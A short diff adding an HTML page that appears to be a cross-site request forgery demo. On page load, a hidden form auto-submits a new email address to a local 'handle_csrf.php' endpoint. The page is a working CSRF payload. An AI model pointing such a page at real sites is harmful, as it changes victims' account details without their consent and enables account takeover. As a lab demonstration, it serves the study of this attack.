@@ -1,0 +1,14 @@
+<!DOCTYPE html>
+<html>
+<body>
+
+<form action="http://localhost:8080/handle_csrf.php" method="post">
+    <input type="hidden" name="email" value="new@gmail.com">
+</form>
+
+<script>
+document.forms[0].submit();
+</script>
+
+</body>
+</html>
